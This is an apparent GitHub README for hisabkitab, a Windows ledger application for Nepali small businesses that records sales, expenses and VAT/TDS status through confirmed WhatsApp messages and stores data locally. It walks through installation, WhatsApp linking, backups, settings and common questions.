# 📊 hisabkitab - Simple bookkeeping for Nepali small businesses

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Thomas3951/hisabkitab)

hisabkitab helps small businesses in Nepal manage their daily finances through WhatsApp. You track your expenses, income, and tax obligations without manual data entry. The system confirms every transaction before saving it. It does not file documents with the government. You remain in control of your financial records at all times.

## 🛠 Prerequisites

Your computer must meet these requirements to run hisabkitab:

* Operating System: Windows 10 or Windows 11.
* Memory: 4 gigabytes of RAM or more.
* Storage: 200 megabytes of free disk space.
* Internet: An active connection for initial setup and synchronization.

## 📥 Installation Steps

Follow these instructions to set up the software on your computer.

1. Visit the following link to access the download page: https://github.com/Thomas3951/hisabkitab
2. Select the latest version listed under the Releases section.
3. Download the file ending in .exe to your computer.
4. Locate the downloaded file in your browser or your Downloads folder.
5. Double-click the file to start the installation process.
6. Follow the prompts on your screen. Click Next until the installation finishes.
7. Click Finish to launch the application.

## 📱 Connecting WhatsApp

hisabkitab uses WhatsApp to record your transactions. You must link your account to allow the application to receive your messages.

1. Open hisabkitab on your desktop.
2. Navigate to the Settings menu.
3. Select the WhatsApp Connection tab.
4. Scan the provided QR code with your phone. 
5. Open WhatsApp on your phone and tap Settings, then Linked Devices.
6. Aim your camera at the QR code on your computer screen.
7. Your account connects once the checkmark appears on your screen.

## 📝 Recording Transactions

Once linked, you send messages to a specific contact to record your business activity. You do not need to open the main software window to log your daily sales or expenses.

### Adding a Sale
Send a message like "Sold 5 bags of rice for 5000 rupees" to your hisabkitab contact. The assistant will analyze your text. It will then reply with a summary. Review this summary. Reply with "Yes" to save the transaction to your ledger.

### Tracking Expenses
Send a message like "Paid 2000 rupees for electricity bill" to the contact. The assistant processes this expense. Reply with "Yes" to confirm the entry.

### Managing Tax
The application monitors your VAT and TDS limits based on your input. It sends a weekly report to your WhatsApp chat. This report details your balance and tax status. You decide when to move funds or update your records.

## 🔒 Data Privacy

Your financial data stays local to your machine. The software uses a database called PostgreSQL to store records securely on your own hard drive. It does not send your private financial information to external clouds for analysis. You hold the master key to your data.

## 📂 Managing Your Data

You manage your files directly through the dashboard. 

* Reports: Generate exportable spreadsheets under the Reports menu. You can download these as CSV files for use in Excel.
* Backups: Select the Backup button to create a saved copy of your database. Keep this file on an external USB drive for extra security.
* History: View your past transactions in the History tab. You can correct mistakes here if you confirm a wrong entry by accident.

## ⚙️ Settings and Configuration

Customize the application to fit your business requirements.

* Business Name: Enter your shop name to appear on generated receipts.
* Currency: Set your local currency settings.
* WhatsApp Profile: Update the phone number associated with your business account.
* Database Location: Choose the folder where the software stores your records. 

## ❓ Frequently Asked Questions

What happens if I lose my internet connection?
The application saves your progress locally. It syncs with your WhatsApp messages as soon as your connection returns.

Can I use this for multiple businesses?
You can create separate database files for different business entities. Open the File menu and select New Database to start a fresh ledger.

Does this software file my taxes with the IRD?
No. hisabkitab provides calculations and summaries for your internal reference. You are responsible for filing all official tax documents with the government.

Is there a monthly fee?
The application is provided as a tool for local ledger management. There are no mandatory monthly subscription fees for using the core features.

How do I remove the application?
Open your Windows Control Panel. Select Programs and Features. Find hisabkitab in the list. Right-click the name and select Uninstall. This removes the application but leaves your data files in their original folder. You may delete the data folder manually if you wish to wipe all financial records.